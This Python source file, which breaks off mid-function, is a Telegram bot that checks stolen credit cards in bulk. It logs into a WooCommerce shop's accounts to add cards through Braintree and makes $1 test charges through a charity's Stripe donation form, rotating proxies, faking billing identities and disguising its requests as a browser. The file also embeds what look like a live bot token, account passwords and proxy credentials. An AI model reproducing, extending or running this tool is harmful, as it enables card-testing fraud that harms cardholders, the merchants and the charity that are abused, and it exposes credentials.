# donate.py - Braintree + Stripe Payment Checker (2099)
# Multi-user concurrent, fully responsive, with reliable stop command.

import os
import re
import time
import asyncio
import base64
import uuid
import random
import json
import html
from faker import Faker
from curl_cffi.requests import AsyncSession

# Telegram libraries
from telegram import Update, Document
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# =============================== CONFIG ===============================
TOKEN = "8312096755:AAFF6KmvIprhQsQMCAhZWOpeFIzFvNchu6g"
OWNER_ID = 5558173816

AUTH_FILE = "authorized_users.json"

ACCOUNTS_LIST = [
    ["adazindig@gmail.com", "Anwarkhd123@"],
    ["its.marockhd@gmail.com", "Anwarkhd123@"],
    ["naxfa.khd1@gmail.com", "Anwarkhd123@"],
    ["nahiihindi@gmail.com", "Anwarkhd123@"],
]

BRIGHTDATA_PROXY = "http://brd-customer-hl_7c3dac05-zone-anwar:bxh0drzkwoqa@brd.superproxy.io:33335"

PROXY_TEST_TIMEOUT = 10
REQUEST_TIMEOUT = 35
MAX_CARDS_PER_FILE = 500
USE_BIN_API = True

working_proxies = []       # Braintree proxies
stripe_proxies = []        # Stripe proxies

# Per-user control
active_tasks = {}          # user_id -> asyncio.Task
user_stop_flags = {}       # user_id -> bool

# =============================== AUTHORIZATION ===============================
def load_authorized_users():
    if os.path.exists(AUTH_FILE):
        with open(AUTH_FILE, 'r') as f:
            return set(json.load(f))
    else:
        default = {OWNER_ID}
        save_authorized_users(default)
        return default

def save_authorized_users(users_set):
    with open(AUTH_FILE, 'w') as f:
        json.dump(list(users_set), f)

authorized_users = load_authorized_users()

def is_authorized(user_id: int) -> bool:
    return user_id in authorized_users

def is_owner(user_id: int) -> bool:
    return user_id == OWNER_ID

# =============================== FLAG UTILITY ===============================
def get_flag_emoji(country_name: str) -> str:
    country_upper = country_name.upper()
    if any(x in country_upper for x in ["TURKEY", "TÜRKIYE", "TURKIYE"]):
        return "🇹🇷"
    if "UNITED STATES" in country_upper or "USA" in country_upper:
        return "🇺🇸"
    if "MALAYSIA" in country_upper:
        return "🇲🇾"
    flags = {
        "MOLDOVA": "🇲🇩", "UNITED KINGDOM": "🇬🇧", "CANADA": "🇨🇦",
        "AUSTRALIA": "🇦🇺", "GERMANY": "🇩🇪", "FRANCE": "🇫🇷",
        "RUSSIA": "🇷🇺", "CHINA": "🇨🇳", "JAPAN": "🇯🇵",
        "BRAZIL": "🇧🇷", "INDIA": "🇮🇳", "ITALY": "🇮🇹",
        "SPAIN": "🇪🇸", "MEXICO": "🇲🇽", "NETHERLANDS": "🇳🇱",
        "SWEDEN": "🇸🇪", "NORWAY": "🇳🇴", "POLAND": "🇵🇱",
        "SOUTH AFRICA": "🇿🇦", "ARGENTINA": "🇦🇷", "CHILE": "🇨🇱",
        "COLOMBIA": "🇨🇴", "PERU": "🇵🇪", "EGYPT": "🇪🇬",
    }
    return flags.get(country_upper, "🏳️")

# =============================== PROXY FUNCTIONS ===============================
def normalize_proxy(proxy_str: str) -> str:
    if proxy_str and "://" not in proxy_str:
        return "http://" + proxy_str
    return proxy_str

# ----- Braintree proxy test -----
async def test_single_proxy_braintree(proxy_str: str):
    if not proxy_str:
        return (False, 0, "Empty")
    proxy = normalize_proxy(proxy_str)
    start = time.time()
    try:
        async with AsyncSession(impersonate="chrome120", proxy=proxy, timeout=PROXY_TEST_TIMEOUT) as session:
            resp = await session.get("https://unclejimswormfarm.com", timeout=PROXY_TEST_TIMEOUT)
            elapsed = time.time() - start
            if resp.status_code == 200:
                return (True, elapsed, None)
            if resp.status_code in [403, 429, 502, 503, 504]:
                return (False, elapsed, f"Blocked (HTTP {resp.status_code})")
            return (False, elapsed, f"HTTP {resp.status_code}")
    except Exception as e:
        elapsed = time.time() - start
        err_msg = str(e)[:50]
        if "timeout" in err_msg.lower():
            err_msg = "Timeout"
        return (False, elapsed, err_msg)

async def test_proxies_braintree_from_bytes(file_bytes: bytes, update: Update, user_id: int):
    content = file_bytes.decode('utf-8', errors='ignore')
    raw = [line.strip() for line in content.splitlines() if line.strip()]
    if not raw:
        await update.message.reply_text("❌ No proxy lines found.")
        return []
    status_msg = await update.message.reply_text(f"🔍 Testing {len(raw)} proxies on Braintree...")
    working = []
    for i, proxy in enumerate(raw):
        if user_stop_flags.get(user_id, False):
            await status_msg.edit_text("🛑 Proxy test stopped by user.")
            return working
        ok, speed, err = await test_single_proxy_braintree(proxy)
        if ok:
            label = "🚀" if speed < 1 else "⚡" if speed < 3 else "🐢"
            working.append({"proxy": proxy, "speed": speed, "label": label})
        if (i+1) % 5 == 0 or (i+1) == len(raw):
            try:
                await status_msg.edit_text(f"🔄 Tested {i+1}/{len(raw)} – Working: {len(working)}")
            except:
                pass
        await asyncio.sleep(0.05)
    await status_msg.edit_text(f"✅ Done. Working: {len(working)}")
    return working

# ----- Stripe proxy test -----
async def test_proxy_on_stripe(proxy_str: str):
    if not proxy_str:
        return (False, 0, "Empty")
    proxy = normalize_proxy(proxy_str)
    start = time.time()
    try:
        async with AsyncSession(impersonate="chrome120", proxy=proxy, timeout=PROXY_TEST_TIMEOUT) as session:
            resp = await session.get("https://api.stripe.com", timeout=PROXY_TEST_TIMEOUT)
            elapsed = time.time() - start
            if resp.status_code in [200, 400, 401, 402, 404]:
                return (True, elapsed, None)
            if resp.status_code == 403:
                try:
                    err = resp.json()
                    if "policy_20050" in str(err):
                        return (False, elapsed, "Blocked by BrightData (KYC required)")
                except:
                    pass
                return (False, elapsed, "HTTP 403 (blocked)")
            return (False, elapsed, f"HTTP {resp.status_code}")
    except Exception as e:
        elapsed = time.time() - start
        return (False, elapsed, str(e)[:50])

async def test_proxies_stripe_from_bytes(file_bytes: bytes, update: Update, user_id: int):
    content = file_bytes.decode('utf-8', errors='ignore')
    raw = [line.strip() for line in content.splitlines() if line.strip()]
    if not raw:
        await update.message.reply_text("❌ No proxy lines found.")
        return []
    status_msg = await update.message.reply_text(f"🔍 Testing {len(raw)} proxies on Stripe API...")
    working = []
    for i, proxy in enumerate(raw):
        if user_stop_flags.get(user_id, False):
            await status_msg.edit_text("🛑 Proxy test stopped by user.")
            return working
        ok, speed, err = await test_proxy_on_stripe(proxy)
        if ok:
            label = "🚀" if speed < 1 else "⚡" if speed < 3 else "🐢"
            working.append({"proxy": proxy, "speed": speed, "label": label})
        if (i+1) % 5 == 0 or (i+1) == len(raw):
            try:
                await status_msg.edit_text(f"🔄 Tested {i+1}/{len(raw)} – Stripe-OK: {len(working)}")
            except:
                pass
        await asyncio.sleep(0.05)
    await status_msg.edit_text(f"✅ Done. {len(working)} proxies work with Stripe.")
    return working

# =============================== BIN LOOKUP ===============================
class tools:
    _bin_cache = {}
    
    @staticmethod
    def getcard(card: str, fm: int = 1, fy: int = 4) -> dict:
        cc, mm, yy, cvv = card.split("|")
        mm = mm.lstrip('0') or '0' if fm == 1 else mm.zfill(2)
        yy = yy[-2:] if fy == 2 else (f"20{yy}" if len(yy) == 2 else yy)
        return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
    
    @staticmethod
    def userdata() -> dict:
        f = Faker()
        fn, ln = f.first_name(), f.last_name()
        return {
            "name": f"{fn} {ln}",
            "first": fn,
            "last": ln,
            "address": "5875 South Aviation Avenue",
            "city": "New York",
            "state": "NY",
            "zip": "10010",
            "email": f.email(),
            "phone": f"2{random.randint(10**8, 10**9-1)}"
        }
    
    @staticmethod
    def find_between(s: str, first: str, last: str) -> str | None:
        try:
            return s.split(first, 1)[1].split(last, 1)[0]
        except:
            return None
    
    @staticmethod
    def ext_rep(text: str) -> str | None:
        reason_match = re.search(r'Reason:\s*(.+?)(?:\.|$|<|\)|\[|\n)', text)
        if reason_match:
            return reason_match.group(1).strip()
        return None
    
    @staticmethod
    def get_full_bin_info(cc: str) -> dict:
        bin6 = cc[:6]
        if bin6 in tools._bin_cache:
            return tools._bin_cache[bin6]
        
        local = {
            "400336": ("VISA", "PLATINUM", "CHASE", "UNITED STATES"),
            "411111": ("VISA", "TEST", "BRAINTREE", "UNITED STATES"),
            "467010": ("VISA", "DEBIT", "INTERNATIONAL BANK OF COMMERCE", "UNITED STATES"),
            "517040": ("MASTERCARD", "DEBIT", "TURKIYE GARANTI BANKASI A.S.", "TÜRKIYE"),
            "555753": ("MASTERCARD", "DEBIT", "SUTTON BANK", "UNITED STATES OF AMERICA (THE)"),
            "539277": ("MASTERCARD", "CREDIT", "CAPITAL ONE, NATIONAL ASSOCIATION", "UNITED STATES OF AMERICA (THE)"),
            "436688": ("VISA", "CREDIT", "PUBLIC BANK BERHAD", "MALAYSIA"),
            "442756": ("VISA", "DEBIT", "JPMORGAN CHASE BANK N.A. - DEBIT", "UNITED STATES OF AMERICA (THE)"),
            "510000": ("MASTERCARD", "STANDARD", "VARIOUS", "UNITED STATES"),
            "340000": ("AMEX", "PERSONAL", "AMERICAN EXPRESS", "UNITED STATES"),
            "601100": ("DISCOVER", "CLASSIC", "DISCOVER BANK", "UNITED STATES"),
            "536257": ("MASTERCARD", "CREDIT", "CB MOLDOVAAGROINDBANK, S.A.", "MOLDOVA"),
        }
        default_info = ("UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN")
        scheme, card_type, bank, country = local.get(bin6, default_info)
        
        if USE_BIN_API and scheme == "UNKNOWN":
            try:
                import requests
                resp = requests.get(f"https://lookup.binlist.net/{bin6}", timeout=5)
                if resp.status_code == 200:
                    data = resp.json()
                    scheme = data.get('scheme', 'UNKNOWN').upper()
                    card_type = data.get('type', 'UNKNOWN').upper()
                    bank = data.get('bank', {}).get('name', 'UNKNOWN')
                    country = data.get('country', {}).get('name', 'UNKNOWN')
            except:
                pass
        
        flag = get_flag_emoji(country)
        result = {
            "type": card_type.upper(),
            "scheme": scheme.upper(),
            "bank": bank.upper(),
            "country": country.upper(),
            "flag": flag
        }
        tools._bin_cache[bin6] = result
        return result

# =============================== BRAINTREE GATEWAY ===============================
class BraintreeGateway:
    @staticmethod
    async def code(card: str, proxy_str: str = None, account: list = None) -> tuple:
        if not account or len(account) < 2:
            return "Error", "No valid account provided", 0.0
        proxy = normalize_proxy(proxy_str) if proxy_str else None
        ccd = tools.getcard(card, 2, 2)
        start_time = time.time()
        email, password = account[0], account[1]
        
        for attempt in range(2):
            try:
                async with AsyncSession(impersonate="chrome120", proxy=proxy, timeout=REQUEST_TIMEOUT) as session:
                    user_data = tools.userdata()
                    session_id = str(uuid.uuid4())
                    
                    headers = {
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'accept-language': 'en,es;q=0.9',
                        'cache-control': 'max-age=0',
                        'referer': 'https://unclejimswormfarm.com/my-account/',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                    }
                    response = await session.get('https://unclejimswormfarm.com/my-account/', headers=headers)
                    login_nonce = tools.find_between(response.text, 'name="woocommerce-login-nonce" value="', '"')
                    if not login_nonce:
                        continue
                    
                    headers['content-type'] = 'application/x-www-form-urlencoded'
                    headers['origin'] = 'https://unclejimswormfarm.com'
                    data = f'username={email}&password={password}&woocommerce-login-nonce={login_nonce}&_wp_http_referer=%2Fmy-account%2F&login=Log+in'
                    response = await session.post('https://unclejimswormfarm.com/my-account/', headers=headers, data=data)
                    
                    headers.pop('content-type', None)
                    headers['referer'] = 'https://unclejimswormfarm.com/my-account/payment-methods/'
                    response = await session.get('https://unclejimswormfarm.com/my-account/add-payment-method/', headers=headers)
                    payment_nonce = tools.find_between(response.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
                    b_token_encrypted = tools.find_between(response.text, 'var wc_braintree_client_token = ["', '"];')
                    if not payment_nonce or not b_token_encrypted:
                        continue
                    
                    b_token_decrypted = str(base64.b64decode(b_token_encrypted))
                    btoken = tools.find_between(b_token_decrypted, '"authorizationFingerprint":"', '","')
                    merchant_id = tools.find_between(b_token_decrypted, 'merchantId":"', '","')
                    
                    headers = {
                        'accept': '*/*',
                        'authorization': f'Bearer {btoken}',
                        'braintree-version': '2018-05-10',
                        'content-type': 'application/json',
                        'origin': 'https://assets.braintreegateway.com',
                        'referer': 'https://assets.braintreegateway.com/',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                    }
                    json_data = {
                        'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': session_id},
                        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear } } }',
                        'variables': {
                            'input': {
                                'creditCard': {
                                    'number': ccd['cc'],
                                    'expirationMonth': ccd['mm'],
                                    'expirationYear': ccd['yy'],
                                    'cvv': ccd['cvv'],
                                    'billingAddress': {'postalCode': user_data['zip'], 'streetAddress': user_data['address']},
                                },
                                'options': {'validate': False},
                            },
                        },
                        'operationName': 'TokenizeCreditCard',
                    }
                    response = await session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
                    token_bc = tools.find_between(response.text, '"token":"', '","')
                    if not token_bc:
                        continue
                    
                    headers = {
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'content-type': 'application/x-www-form-urlencoded',
                        'origin': 'https://unclejimswormfarm.com',
                        'referer': 'https://unclejimswormfarm.com/my-account/add-payment-method/',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                    }
                    config_data = f'{{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/{merchant_id}/client_api","assetsUrl":"https://assets.braintreegateway.com","merchantId":"{merchant_id}","graphQL":{{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]}}}}'
                    data = f'payment_method=braintree_cc&braintree_cc_nonce_key={token_bc}&braintree_cc_device_data=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data={config_data}&woocommerce-add-payment-method-nonce={payment_nonce}&_wp_http_referer=/my-account/add-payment-method/&woocommerce_add_payment_method=1'
                    response = await session.post('https://unclejimswormfarm.com/my-account/add-payment-method/', headers=headers, data=data, allow_redirects=True)
                    
                    resp = response.text
                    if "New payment method added" in str(resp):
                        elapsed = time.time() - start_time
                        return "Approved", "Braintree Auth ✅", elapsed
                    
                    error_msg = tools.find_between(resp, '<ul class="woocommerce-error"', '</ul>')
                    if error_msg:
                        reason = tools.ext_rep(error_msg) or error_msg[:150]
                        elapsed = time.time() - start_time
                        return "Declined", reason, elapsed
                    elapsed = time.time() - start_time
                    return "Error", "Unknown gateway response", elapsed
                    
            except Exception:
                continue
        elapsed = time.time() - start_time
        return "Error", "Connection error after retries", elapsed

# =============================== STRIPE GATEWAY ===============================
class StripeGateway:
    _cached_form_data = None
    _cache_time = 0
    _cache_ttl = 300

    @staticmethod
    async def get_form_data(session, ua):
        urls_to_try = [
            "https://ccfoundationorg.com/donate/",
            "http://ccfoundationorg.com/donate/",
            "https://ccfoundation.org/donate/",
            "http://ccfoundation.org/donate/"
        ]
        for url in urls_to_try:
            try:
                headers = {'User-Agent': ua, 'Accept': 'text/html'}
                response = await session.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
                if response.status_code == 200:
                    html = response.text
                    fid = re.search(r'name="charitable_form_id" value="([^"]+)"', html)
                    nonce = re.search(r'name="_charitable_donation_nonce" value="([^"]+)"', html)
                    cid = re.search(r'name="campaign_id" value="([^"]+)"', html)
                    pk = re.search(r'"key":"(pk_live_[^"]+)"', html) or re.search(r'pk_live_[a-zA-Z0-9_]+', html)
                    if all([fid, nonce, cid, pk]):
                        pk_val = pk.group(1) if pk.groups() else pk.group(0)
                        return pk_val, fid.group(1), nonce.group(1), cid.group(1)
            except:
                continue
        return None

    @staticmethod
    async def _fetch_form_data_with_retry():
        import time as time_module
        now = time_module.time()
        if StripeGateway._cached_form_data and (now - StripeGateway._cache_time) < StripeGateway._cache_ttl:
            return StripeGateway._cached_form_data
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        try:
            async with AsyncSession(impersonate="chrome120", timeout=REQUEST_TIMEOUT) as session:
                data = await StripeGateway.get_form_data(session, ua)
                if data:
                    StripeGateway._cached_form_data = data
                    StripeGateway._cache_time = now
                    return data
        except:
            pass
        
        if stripe_proxies:
            for proxy_info in stripe_proxies[:3]:
                try:
                    proxy = normalize_proxy(proxy_info['proxy'])
                    async with AsyncSession(impersonate="chrome120", proxy=proxy, timeout=REQUEST_TIMEOUT) as session:
                        data = await StripeGateway.get_form_data(session, ua)
                        if data:
                            StripeGateway._cached_form_data = data
                            StripeGateway._cache_time = now
                            return data
                except:
                    continue
        return None

    @staticmethod
    async def create_pm(session, ua, pk, cc, mm, yy, cvc, fake):
        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())
        fn, ln = fake.first_name(), fake.last_name()
        
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': ua,
        }
        data = {
            'type': 'card',
            'billing_details[name]': f'{fn} {ln}',
            'billing_details[email]': f"{fn.lower()}.{ln.lower()}{random.randint(100, 999)}@gmail.com",
            'billing_details[address][line1]': fake.street_address(),
            'billing_details[address][postal_code]': fake.zipcode(),
            'card[number]': cc,
            'card[cvc]': cvc,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'payment_user_agent': 'stripe.js/33c734767c; stripe-js-v3/33c734767c; card-element',
            'referrer': 'https://ccfoundationorg.com',
            'time_on_page': str(random.randint(30000, 90000)),
            'key': pk,
        }
        try:
            resp = await session.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data, timeout=REQUEST_TIMEOUT)
            res = resp.json()
            if resp.status_code == 200:
                return res.get('id'), None
            err = res.get('error', {})
            return None, err.get('message') or err.get('code') or 'Unknown Error'
        except Exception as e:
            return None, str(e)[:80]

    @staticmethod
    async def pay(session, ua, fid, nonce, cid, pm, fake):
        fn, ln = fake.first_name(), fake.last_name()
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://ccfoundationorg.com',
            'referer': 'https://ccfoundationorg.com/donate/',
            'user-agent': ua,
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'charitable_form_id': fid,
            fid: '',
            '_charitable_donation_nonce': nonce,
            '_wp_http_referer': '/donate/',
            'campaign_id': cid,
            'description': 'CC Foundation Donation Form',
            'ID': '0',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'recurring_donation': 'once',
            'title': random.choice(['Mr', 'Mrs', 'Ms']),
            'first_name': fn,
            'last_name': ln,
            'email': f"{fn.lower()}.{ln.lower()}@gmail.com",
            'address': fake.street_address(),
            'postcode': fake.zipcode(),
            'city': fake.city(),
            'country': 'US',
            'gateway': 'stripe',
            'stripe_payment_method': pm,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }
        try:
            resp = await session.post("https://ccfoundationorg.com/wp-admin/admin-ajax.php", headers=headers, data=data, timeout=REQUEST_TIMEOUT)
            res = resp.json()
            if res.get('success'):
                return "Approved ✅ $1 Charged"
            errors = res.get('errors', [])
            if errors:
                msg = errors[0] if isinstance(errors, list) else str(errors)
                if 'insufficient' in msg.lower():
                    return "Declined ⭕ Insufficient Funds"
                return f"{msg[:100]}⭕️"
            return "Card Declined"
        except Exception:
            if 'thank you' in resp.text.lower():
                return "Approved ✅ $1 Charged"
            return "Declined ⭕ Connection Error"

    @staticmethod
    async def check_card(card_line: str, proxy_str: str = None) -> tuple:
        start_time = time.time()
        parts = card_line.split("|")
        if len(parts) < 4:
            return "Error", "Invalid format", 0.0
        cc, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 4:
            yy = yy[2:]
        
        form_data = await StripeGateway._fetch_form_data_with_retry()
        if not form_data:
            return "Error", "Site down or form not found", time.time() - start_time
        
        pk, fid, nonce, cid = form_data
        
        try:
            if proxy_str:
                proxy = normalize_proxy(proxy_str)
                session = AsyncSession(impersonate="chrome120", proxy=proxy, timeout=REQUEST_TIMEOUT)
            else:
                session = AsyncSession(impersonate="chrome120", timeout=REQUEST_TIMEOUT)
            
            async with session:
                ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                fake = Faker()
                
                pm, err = await StripeGateway.create_pm(session, ua, pk, cc, mm, yy, cvc, fake)
                if not pm:
                    return "Declined", err, time.time() - start_time
                
                result_msg = await StripeGateway.pay(session, ua, fid, nonce, cid, pm, fake)
                elapsed = time.time() - start_time
                if "Approved" in result_msg:
                    return "Approved", result_msg, elapsed
                else:
                    return "Declined", result_msg, elapsed
        except Exception as e:
            elapsed = time.time() - start_time
            return "Error", str(e)[:80], elapsed

# =============================== HTML FORMATTING ===============================
def get_user_display(user):
    return f"@{user.username}" if user.username else (user.first_name or "User")

def format_card_response_html(card_line: str, status: str, response_msg: str, elapsed: float, user, gateway="Stripe"):
    parts = card_line.split("|")
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3] if len(parts)>=4 else (parts[0], "?", "?", "?")
    bin_info = tools.get_full_bin_info(cc)
    bin6 = cc[:6]
    card_type = bin_info.get("type", "UNKNOWN")
    scheme = bin_info.get("scheme", "UNKNOWN")
    bank = bin_info.get("bank", "UNKNOWN")
    country = bin_info.get("country", "UNKNOWN")
    flag = bin_info.get("flag", "🏳️")
    
    if status.lower() == "approved":
        status_display = "✅ Approved"
    elif status.lower() == "declined":
        status_display = "⭕ Declined"
    else:
        status_display = "⚠️ Error"
    
    safe_response = html.escape(response_msg[:200])
    safe_status = html.escape(status_display)
    safe_card_display = html.escape(f"{cc}|{mm}|{yy}|{cvv}")
    safe_bin6 = html.escape(bin6)
    safe_card_type = html.escape(card_type)
    safe_scheme = html.escape(scheme)
    safe_bank = html.escape(bank)
    safe_country = html.escape(country)
    safe_user = html.escape(get_user_display(user))
    safe_gateway = html.escape(gateway)
    
    time_str = f"{elapsed:.1f} second{'s' if elapsed != 1 else ''}"
    
    result = (
        f"━━━━━━━━━━━━━━━━━━\n"
        f"💳‍🔥 <b>Card</b> ➨ <code>{safe_card_display}</code>\n"
        f"⛩️‍🔥 <b>Gate</b> ➨ {safe_gateway}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🚨‍🔥 <b>Status</b> ➨ {safe_status}\n"
        f"♻️‍🔥 <b>Response</b> ➨ {safe_response}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📟‍🔥 <b>Bin</b> ➨ <code>{safe_bin6}</code>\n"
        f"💬‍🔥 <b>Type</b> ➨ {safe_card_type}\n"
        f"🗂️‍🔥 <b>Scheme</b> ➨ {safe_scheme}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🏦‍🔥  <b>Bank</b> ➨ {safe_bank}\n"
        f"‍🌍🔥 <b>Country</b> ➨ {safe_country}\n"
        f"🏴‍☠️‍🔥 <b>Flag</b> ➨ {flag}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"⏳‍🔥 <b>Time</b> ➨ {time_str}\n"
        f"🆔‍🔥 <b>Check by</b> ➨ {safe_user}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )
    return result

# =============================== FILE SCAN TASKS (with stop flag and yield) ===============================
async def run_braintree_file_scan(update: Update, context: ContextTypes.DEFAULT_TYPE, file_bytes: bytes):
    user_id = update.effective_user.id
    content = file_bytes.decode('utf-8', errors='ignore')
    lines = [line.strip() for line in content.splitlines() if line.strip() and '|' in line]
    if not lines:
        await update.message.reply_text("❌ No valid cards found.", parse_mode=ParseMode.HTML)
        return
    if len(lines) > MAX_CARDS_PER_FILE:
        await update.message.reply_text(f"❌ Too many cards ({len(lines)}). Max {MAX_CARDS_PER_FILE}.", parse_mode=ParseMode.HTML)
        return
    
    total = len(lines)
    user = update.effective_user
    header = f"📁 <b>Braintree File Scan</b>\nTotal cards: <code>{total}</code>\n\n"
    msg = await update.message.reply_text(header + "🔄 Scanning... 0%", parse_mode=ParseMode.HTML)
    approved = 0
    declined = 0
    errors = 0
    
    for idx, card_line in enumerate(lines, 1):
        # Give event loop chance to process other commands (including /stop)
        await asyncio.sleep(0)
        
        if user_stop_flags.get(user_id, False):
            await update.message.reply_text("🛑 File scan stopped by user.", parse_mode=ParseMode.HTML)
            break
        
        account = random.choice(ACCOUNTS_LIST)
        proxy_info = random.choice(working_proxies)
        proxy = proxy_info['proxy']
        try:
            status, reason, elapsed = await BraintreeGateway.code(card_line, proxy, account)
            if status == "Approved":
                approved += 1
                result_text = format_card_response_html(card_line, status, reason, elapsed, user, gateway="Braintree")
                await update.message.reply_text(result_text, parse_mode=ParseMode.HTML)
            elif status == "Declined":
                declined += 1
            else:
                errors += 1
        except Exception:
            errors += 1
        
        if idx % 2 == 0 or idx == total:
            progress = (idx * 100) // total
            text = header + f"📊 <b>Progress</b>: {idx}/{total} ({progress}%)\n"
            text += f"✅ Approved: {approved} | ❌ Declined: {declined} | ⚠️ Errors: {errors}\n"
            if idx < total:
                text += "\n⏳ Continuing..."
            else:
                text += "\n✅ <b>Scan completed!</b>"
            try:
                await msg.edit_text(text, parse_mode=ParseMode.HTML)
            except:
                pass
    
    if not user_stop_flags.get(user_id, False):
        final = header + f"\n✅ <b>Final Results</b>\nApproved: <code>{approved}</code> | Declined: <code>{declined}</code> | Errors: <code>{errors}</code>"
        await msg.edit_text(final, parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(f"📊 <b>Scan interrupted</b>\nProcessed: {idx-1}/{total}\nApproved: {approved} | Declined: {declined} | Errors: {errors}", parse_mode=ParseMode.HTML)

async def run_stripe_file_scan(update: Update, context: ContextTypes.DEFAULT_TYPE, file_bytes: bytes):
    user_id = update.effective_user.id
    content = file_bytes.decode('utf-8', errors='ignore')
    lines = [line.strip() for line in content.splitlines() if line.strip() and '|' in line]
    if not lines:
        await update.message.reply_text("❌ No valid cards found.", parse_mode=ParseMode.HTML)
        return
    if len(lines) > MAX_CARDS_PER_FILE:
        await update.message.reply_text(f"❌ Too many cards ({len(lines)}). Max {MAX_CARDS_PER_FILE}.", parse_mode=ParseMode.HTML)
        return
    
    total = len(lines)
    user = update.effective_user
    header = f"📁 <b>Stripe File Scan</b>\nTotal cards: <code>{total}</code>\n\n"
    msg = await update.message.reply_text(header + "🔄 Scanning... 0%", parse_mode=ParseMode.HTML)
    approved = 0
    declined = 0
    errors = 0
    
    for idx, card_line in enumerate(lines, 1):
        await asyncio.sleep(0)   # CRITICAL: allow event loop to process /stop and other commands
        
        if user_stop_flags.get(user_id, False):
            await update.message.reply_text("🛑 File scan stopped by user.", parse_mode=ParseMode.HTML)
            break
        
        proxy_info = random.choice(stripe_proxies)
        proxy = proxy_info['proxy']
        try:
            status, reason, elapsed = await StripeGateway.check_card(card_line, proxy)
            if status == "Approved":
                approved += 1
                result_text = format_card_response_html(card_line, status, reason, elapsed, user, gateway="Stripe")
                await update.message.reply_text(result_text, parse_mode=ParseMode.HTML)
            elif status == "Declined":
                declined += 1
            else:
                errors += 1
        except Exception:
            errors += 1
        
        if idx % 2 == 0 or idx == total:
            progress = (idx * 100) // total
            text = header + f"📊 <b>Progress</b>: {idx}/{total} ({progress}%)\n"
            text += f"✅ Approved: {approved} | ❌ Declined: {declined} | ⚠️ Errors: {errors}\n"
            if idx < total:
                text += "\n⏳ Continuing..."
            else:
                text += "\n✅ <b>Scan completed!</b>"
            try:
                await msg.edit_text(text, parse_mode=ParseMode.HTML)
            except:
                pass
    
    if not user_stop_flags.get(user_id, False):
        final = header + f"\n✅ <b>Final Results</b>\nApproved: <code>{approved}</code> | Declined: <code>{declined}</code> | Errors: <code>{errors}</code>"
        await msg.edit_text(final, parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(f"📊 <b>Scan interrupted</b>\nProcessed: {idx-1}/{total}\nApproved: {approved} | Declined: {declined} | Errors: {errors}", parse_mode=ParseMode.HTML)

async def run_proxy_test_task(update: Update, context: ContextTypes.DEFAULT_TYPE, file_bytes: bytes, gateway_type: str):
    user_id = update.effective_user.id
    if gateway_type == "braintree":
        working = await test_proxies_braintree_from_bytes(file_bytes, update, user_id)
        if not user_stop_flags.get(user_id, False):
            if working:
                global working_proxies
                working_proxies = working
                msg = "✅ <b>Working Braintree Proxies:</b>\n"
                for p in working[:15]:
                    msg += f"{p['label']} <code>{html.escape(p['proxy'])}</code> – {p['speed']:.2f}s\n"
                if len(working) > 15:
                    msg += f"\n... and {len(working)-15} more"
                await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text("❌ No working proxies found for Braintree.", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text("🛑 Proxy test stopped.", parse_mode=ParseMode.HTML)
    else:
        working = await test_proxies_stripe_from_bytes(file_bytes, update, user_id)
        if not user_stop_flags.get(user_id, False):
            if working:
                global stripe_proxies
                stripe_proxies = working
                msg = "✅ <b>Stripe-Compatible Proxies:</b>\n"
                for p in working[:15]:
                    msg += f"{p['label']} <code>{html.escape(p['proxy'])}</code> – {p['speed']:.2f}s\n"
                if len(working) > 15:
